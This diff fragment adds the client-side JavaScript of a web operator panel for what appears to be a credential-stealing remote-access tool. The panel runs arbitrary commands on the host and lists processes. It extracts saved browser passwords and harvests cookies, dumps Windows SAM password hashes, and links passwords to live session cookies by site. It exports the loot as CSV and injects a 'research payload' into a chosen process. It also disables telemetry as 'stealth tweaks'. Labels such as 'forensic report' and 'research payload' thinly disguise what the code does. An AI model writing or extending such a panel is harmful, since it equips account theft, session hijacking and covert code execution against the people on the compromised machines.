+                el.style.color = isAdmin ? '#34c759' : 'var(--text-2)';
+                const dash = document.getElementById('dash-priv');
+                dash.innerText = isAdmin ? 'ADMIN' : 'USER';
+                dash.className = 'stat-value ' + (isAdmin ? 'green' : 'dim');
+            } catch(e) {
+                document.getElementById('admin-status').innerText = '[OFFLINE]';
+                document.getElementById('admin-status').style.color = '#ff3b30';
+                const dash = document.getElementById('dash-priv');
+                dash.innerText = 'OFFLINE';
+                dash.className = 'stat-value dim';
+            }
+        };
+
+        window.loadHex = async function() {
+            const el = document.getElementById('hex-body');
+            try {
+                const r = await window.req('/v1/sys/hex');
+                const t = await r.text();
+                el.innerText = t ? t.match(/.{1,2}/g).join(' ') : '[NO_PAYLOAD_FILE]';
+                const d = document.getElementById('dash-hex');
+                d.innerText = t ? (t.length + ' B') : 'EMPTY';
+                d.className = 'stat-value ' + (t ? 'accent' : 'dim');
+                window._hexLoaded = true;
+            } catch(e) {
+                el.innerText = '[CONNECTION_FAILED]';
+                document.getElementById('dash-hex').innerText = 'ERR';
+            }
+        };
+
+        /* ---------- processes ---------- */
+        window.fetchProcs = async function() {
+            try {
+                const r = await window.req('/v1/sys/b2');
+                const d = await r.json();
+                const b = document.getElementById('proc-body');
+                b.innerHTML = '';
+                d.sort((x,y)=>x.name.localeCompare(y.name)).forEach(p => {
+                    const tr = document.createElement('tr');
+                    tr.className = 'row-proc';
+                    if (window.selectedPid === p.pid) tr.classList.add('selected');
+                    tr.innerHTML = `<td style="font-family:monospace; color:var(--accent);">${window.esc(p.pid)}</td><td>${window.esc(p.name)}</td><td>${window.esc(p.user)}</td><td style="font-family:monospace;">${window.esc(p.mem)}</td>`;
+                    tr.onclick = function() {
+                        document.querySelectorAll('.row-proc').forEach(x=>x.classList.remove('selected'));
+                        tr.classList.add('selected');
+                        window.selectedPid = p.pid;
+                        document.getElementById('target-pid').value = p.pid;
+                        const dt = document.getElementById('dash-target');
+                        dt.innerText = p.pid;
+                        window.toast('Injection target set: ' + p.pid + ' (' + p.name + ')', 'INFO');
+                    };
+                    b.appendChild(tr);
+                });
+                document.getElementById('proc-count').innerText = d.length + ' processes';
+            } catch(e) {
+                window.log('Failed to fetch processes', 'ERROR');
+            }
+        };
+
+        window.filterProcs = function() {
+            const v = document.getElementById('p-search').value.toLowerCase();
+            document.querySelectorAll('#proc-body tr').forEach(r => r.style.display = r.innerText.toLowerCase().includes(v) ? '' : 'none');
+        };
+
+        /* ---------- terminal ---------- */
+        window.runCmd = async function() {
+            const c = document.getElementById('cmd-in').value;
+            if (!c) return;
+            window.log('EXEC: ' + c, 'INFO');
+            try {
+                const r = await window.req('/v1/sys/cmd', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({c})
+                });
+                const out = await r.text();
+                const co = document.getElementById('console-out');
+                co.innerHTML += `<div style="color:var(--accent); margin-top:10px; font-weight:700; font-family:var(--mono);">&gt; ${window.esc(c)}</div><pre style="color:#eee; font-size:12.5px; white-space:pre-wrap; margin:5px 0;">${window.esc(out)}</pre>`;
+                document.getElementById('cmd-in').value = '';
+                co.scrollTop = co.scrollHeight;
+            } catch(e) {
+                window.log('Command failed: ' + e, 'ERROR');
+            }
+        };
+
+        /* ---------- decrypter ---------- */
+        window._intelHead = function(cols) {
+            document.getElementById('intel-head').innerHTML = '<tr>' + cols.map(c => `<th>${window.esc(c)}</th>`).join('') + '</tr>';
+            // Light up the toolbar button for the active extractor.
+            document.querySelectorAll('.intel-tab').forEach(function(b) {
+                const on = b.dataset.mode === window._intelMode;
+                b.classList.toggle('btn-primary', on);
+                b.classList.toggle('btn-ghost', !on);
+            });
+        };
+        window._intelWait = function(msg) {
+            document.getElementById('intel-body').innerHTML = `<tr class="empty-row"><td colspan="99">${window.esc(msg || 'Working… (results stream via WebSocket)')}</td></tr>`;
+        };
+
+        window.extractIntel = async function() {
+            window.showView('intel');
+            window._intelMode = 'creds';
+            window.log('Extracting passwords…', 'INFO');
+            window._intelHead(['APP', 'URL', 'USER', 'DATA']);
+            window._intelWait();
+            window._a7Data = [];
+            window._renderA7 = function(d) {
+                const body = document.getElementById('intel-body');
+                if (d.length === 0) {
+                    body.innerHTML = '<tr class="empty-row"><td colspan="4" style="color:var(--red);">No data found or access denied.</td></tr>';
+                } else {
+                    // Single join (innerHTML += per row was O(N^2) and froze
+                    // the tab with thousands of rows); cap the DOM and leave
+                    // the full set to Export CSV.
+                    const cap = Math.min(d.length, 5000);
+                    const rows = [];
+                    for (let i = 0; i < cap; i++) {
+                        const e = d[i];
+                        rows.push(`<tr><td>${window.esc(e.b)}</td><td style="max-width:220px; overflow:hidden; text-overflow:ellipsis;">${window.esc(e.u)}</td><td>${window.esc(e.s)}</td><td style="color:var(--green); font-weight:700; font-family:var(--mono);">${window.esc(e.p)}</td></tr>`);
+                    }
+                    if (d.length > cap) rows.push(`<tr class="empty-row"><td colspan="4">… ${d.length - cap} more rows not rendered — use Export CSV.</td></tr>`);
+                    body.innerHTML = rows.join('');
+                }
+                window.log('Extraction done: ' + d.length + ' items', 'SUCCESS');
+            };
+            try {
+                await window.req('/v1/op/a7', {method:'POST'});
+            } catch(e) {
+                window.log('Extraction blocked: ' + (e.message || e), 'ERROR');
+                window._intelHead(['APP', 'URL', 'USER', 'DATA']);
+                document.getElementById('intel-body').innerHTML = `<tr class="empty-row"><td colspan="4" style="color:var(--red);">${window.esc(e.message || 'Connection failed')}</td></tr>`;
+            }
+        };
+
+        window.extractCookies = async function() {
+            window.showView('intel');
+            window._intelMode = 'cookies';
+            window.log('Harvesting cookies…', 'INFO');
+            window._intelHead(['APP', 'HOST', 'NAME', 'VALUE']);
+            window._intelWait();
+            window._cookiesData = [];
+            window._renderCookies = function(d) {
+                const body = document.getElementById('intel-body');
+                if (d.length === 0) {
+                    body.innerHTML = '<tr class="empty-row"><td colspan="4" style="color:var(--red);">No cookies found or database locked.</td></tr>';
+                } else {
+                    // Single join instead of per-row innerHTML += (O(N^2));
+                    // cap the DOM — the full harvest is exportable via CSV.
+                    const cap = Math.min(d.length, 5000);
+                    const rows = [];
+                    for (let i = 0; i < cap; i++) {
+                        const e = d[i];
+                        rows.push(`<tr><td>${window.esc(e.b)}</td><td style="color:var(--accent);">${window.esc(e.h)}</td><td style="font-weight:600;">${window.esc(e.n)}</td><td style="color:var(--green); max-width:320px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; font-family:var(--mono); font-size:11px;">${window.esc(e.v)}</td></tr>`);
+                    }
+                    if (d.length > cap) rows.push(`<tr class="empty-row"><td colspan="4">… ${d.length - cap} more rows not rendered — use Export CSV.</td></tr>`);
+                    body.innerHTML = rows.join('');
+                }
+                window.log('Harvest done: ' + d.length + ' cookies', 'SUCCESS');
+            };
+            try {
+                await window.req('/v1/op/cookies', {method:'POST'});
+            } catch(e) {
+                window.log('Collection blocked: ' + (e.message || e), 'ERROR');
+                document.getElementById('intel-body').innerHTML = `<tr class="empty-row"><td colspan="4" style="color:var(--red);">${window.esc(e.message)}</td></tr>`;
+            }
+        };
+
+        window.extractSAM = async function() {
+            window.showView('intel');
+            window._intelMode = 'sam';
+            window.log('Dumping SAM hashes…', 'INFO');
+            window._intelHead(['RID', 'USER', 'LM', 'NT']);
+            window._intelWait();
+            window._samData = [];
+            window._renderSAM = function(d) {
+                const body = document.getElementById('intel-body');
+                body.innerHTML = '';
+                if (d.length === 0) body.innerHTML = '<tr class="empty-row"><td colspan="4" style="color:var(--red);">No SAM material (needs elevation or remote registry unavailable).</td></tr>';
+                for (const e of d) {
+                    body.innerHTML += `<tr><td style="font-family:var(--mono); color:var(--accent);">${window.esc(e.rid)}</td><td style="font-weight:600;">${window.esc(e.user)}</td><td style="font-family:var(--mono); font-size:11px; color:var(--dim);">${window.esc(e.lm)}</td><td style="font-family:var(--mono); font-size:11px; color:var(--amber);">${window.esc(e.nt)}</td></tr>`;
+                }
+                window.log('SAM dump done: ' + d.length + ' accounts', 'SUCCESS');
+            };
+            try {
+                await window.req('/v1/sys/sam', {method:'POST'});
+            } catch(e) {
+                window.log('SAM dump blocked: ' + (e.message || e), 'ERROR');
+                document.getElementById('intel-body').innerHTML = `<tr class="empty-row"><td colspan="4" style="color:var(--red);">${window.esc(e.message)}</td></tr>`;
+            }
+        };
+
+        window.extractNexus = async function() {
+            window.showView('intel');
+            window._intelMode = 'nexus';
+            window.log('Analyzing identity nexus…', 'INFO');
+            window._intelHead(['DOMAIN', 'USER', 'PASSWORD', 'SESSION']);
+            window._intelWait('Correlating…');
+            try {
+                const r = await window.req('/v1/sys/nexus');
+                const d = await r.json();
+                const body = document.getElementById('intel-body');
+                body.innerHTML = '';
+                const keys = Object.keys(d);
+                if (keys.length === 0) body.innerHTML = '<tr class="empty-row"><td colspan="4" style="color:var(--red);">No correlations found. Try extracting Passwords and Cookies first.</td></tr>';
+                for (const site in d) {
+                    const node = d[site];
+                    const isCritical = node.p && node.c;
+                    body.innerHTML += `<tr style="${isCritical?'background:rgba(255,69,58,0.08);':''}">
+                        <td style="color:${isCritical?'var(--red)':'var(--text)'}; font-weight:700;">${window.esc(site)}</td>
+                        <td>${window.esc(node.u) || 'N/A'}</td>
+                        <td style="color:${node.p?'var(--green)':'var(--dim)'}; font-family:var(--mono);">${window.esc(node.p) || 'MISSING'}</td>
+                        <td style="color:${node.c?'var(--amber)':'var(--dim)'}; font-family:var(--mono); font-size:11px;">${window.esc(node.c) || 'INACTIVE'}</td>
+                    </tr>`;
+                }
+                window.log('Nexus analysis done: ' + keys.length + ' nodes', 'SUCCESS');
+            } catch(e) {
+                window.log('Nexus error: ' + (e.message || e), 'ERROR');
+                document.getElementById('intel-body').innerHTML = `<tr class="empty-row"><td colspan="4" style="color:var(--red);">${window.esc(e.message || 'Analysis failed')}</td></tr>`;
+            }
+        };
+
+        window.exportIntelCSV = function() {
+            let csv = [];
+            const rows = document.querySelectorAll('#view-intel tr');
+            for (let r of rows) {
+                let cols = r.querySelectorAll('td, th'), cData = [];
+                for (let c of cols) cData.push('"' + c.innerText.replace(/"/g, '""') + '"');
+                csv.push(cData.join(','));
+            }
+            const blob = new Blob([csv.join('\n')], {type:'text/csv'}),
+                  url = window.URL.createObjectURL(blob),
+                  a = document.createElement('a');
+            a.href = url;
+            a.download = 'forensic_report_' + new Date().toISOString().slice(0,19).replace(/:/g,'-') + '.csv';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            window.URL.revokeObjectURL(url);
+            window.log('CSV exported', 'SUCCESS');
+        };
+
+        /* ---------- optimizer ---------- */
+        window.applyTweaks = async function() {
+            const ok = await window.confirmModal(
+                'Apply stealth tweaks',
+                'This host-wide action disables telemetry services and registry policy keys (<span class="mono">DiagTrack</span>, diagnostic tracking, track-programs). Continue?',
+                'Apply tweaks'
+            );
+            if (!ok) return;
+            const o = document.getElementById('opt-log');
+            o.innerHTML += `<div style="color:#888">[${new Date().toLocaleTimeString()}] Initiating optimization sequence…</div>`;
+            try {
+                const r = await window.req('/v1/sys/opt', {method:'POST'});
+                const d = await r.json();
+                d.forEach(x => o.innerHTML += `<div style="color:${String(x).includes('FAIL')?'var(--red)':'var(--green)'}; margin:2px 0;">▸ ${window.esc(x)}</div>`);
+                o.scrollTop = o.scrollHeight;
+                window.log('Optimization complete', 'SUCCESS');
+            } catch(e) {
+                o.innerHTML += `<div style="color:var(--red)">▸ FAILED: ${window.esc(e.message || e)}</div>`;
+                window.log('Optimization failed', 'ERROR');
+            }
+        };
+
+        /* ---------- architect ---------- */
+        window.injectSignal = async function() {
+            if (!window.selectedPid) {
+                window.toast('Select a PID in the Processes view first', 'ERROR');
+                window.showView('proc');
+                return;
+            }
+            const ok = await window.confirmModal(
+                'Quantum Sync',
+                `Dispatch the research payload into PID <span class="mono">${window.esc(window.selectedPid)}</span>? The target process will execute the injected code. Requires <span class="mono">--enable-inject</span>.`,
+                'Inject',
+                true
+            );
+            if (!ok) return;
+            window.log('Injecting pulse into ' + window.selectedPid, 'INFO');
+            document.getElementById('sig-status').innerText = '[DISPATCHING → PID ' + window.selectedPid + ']';
+            try {
+                await window.req('/v1/op/d4', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({pid: window.selectedPid})
+                });
+                document.getElementById('sig-status').innerText = '[PULSE_SENT → PID ' + window.selectedPid + ']';
+                window.log('PULSE_SENT', 'SUCCESS');
+            } catch(e) {
+                document.getElementById('sig-status').innerText = '[BLOCKED] ' + (e.message || e);
+                window.log('INJECTION_BLOCKED: ' + (e.message || e), 'ERROR');
+            }
+        };
+
+        /* ---------- audit ---------- */
+        window.runAudit = async function() {
+            const body = document.getElementById('audit-body');
+            const summary = document.getElementById('audit-summary');
+            summary.innerText = 'running…';
+            body.innerHTML = '<tr class="empty-row"><td colspan="5">Reading registry, token privileges and service states…</td></tr>';
+            try {
+                const r = await window.req('/v1/audit/report', {method:'POST'});
+                const rep = await r.json();
+                body.innerHTML = '';
+                const sevColor = {CRITICAL:'var(--red)', HIGH:'var(--red)', MEDIUM:'var(--amber)', LOW:'var(--accent)', INFO:'var(--text-2)'};
+                const statMark = {pass:'✔', fail:'✘', unknown:'?'};
+                for (const f of (rep.findings || [])) {
+                    const stColor = f.status === 'fail' ? 'var(--red)' : f.status === 'pass' ? 'var(--green)' : 'var(--amber)';
+                    body.innerHTML += `<tr>
+                        <td style="font-family:var(--mono); color:var(--accent); white-space:nowrap;">${window.esc(f.id)}</td>
+                        <td style="color:${sevColor[f.severity] || 'var(--dim)'}; font-weight:700;">${window.esc(f.severity)}</td>
+                        <td style="color:${stColor}; font-family:var(--mono); white-space:nowrap;">${statMark[f.status] || '·'} ${window.esc(f.status)}</td>
+                        <td>${window.esc(f.title)}<div style="font-size:10.5px; color:var(--dim); font-family:var(--mono);">${window.esc(f.technique)} ${f.module ? '· ' + window.esc(f.module) : ''}</div></td>
+                        <td style="max-width:300px; font-size:11px; color:var(--text-2);">${window.esc(f.evidence)}</td>
+                    </tr>`;
+                }
+                const s = rep.summary || {};
+                summary.innerText = `CRIT ${s.CRITICAL||0} · HIGH ${s.HIGH||0} · MED ${s.MEDIUM||0} · LOW ${s.LOW||0} · INFO ${s.INFO||0} ${rep.elevated ? '· [ADMIN]' : '· [USER]'}`;
+                window.log('Audit complete: ' + (rep.findings || []).length + ' checks', 'SUCCESS');
+            } catch(e) {
+                summary.innerText = 'error';
+                body.innerHTML = `<tr class="empty-row"><td colspan="5" style="color:var(--red);">${window.esc(e.message || e)}</td></tr>`;
+            }
+        };
+
+        window.exportAuditCSV = async function() {
+            try {
+                const r = await window.req('/v1/audit/csv', {method:'POST'});
+                const blob = await r.blob();
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'obliteratus_audit_' + new Date().toISOString().slice(0,19).replace(/:/g,'-') + '.csv';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                window.URL.revokeObjectURL(url);
+                window.log('Audit CSV exported', 'SUCCESS');
+            } catch(e) {
+                window.log('CSV export failed: ' + (e.message || e), 'ERROR');
+            }
+        };
+
+        /* ---------- clock + status refresh ---------- */
+        setInterval(function() {
+            const clock = document.getElementById('clock');
+            if (clock) {
+                clock.innerText = new Date().toLocaleString('en-US', {
+                    weekday: 'short', month: 'short', day: 'numeric',
+                    hour: 'numeric', minute: '2-digit', hour12: true
+                });
+            }
+        }, 1000);
+
+        setInterval(function() {
+            if (document.getElementById('app').style.display === 'flex') window.checkStatus();
+        }, 30000);
+    </script>
+</body>
+</html>
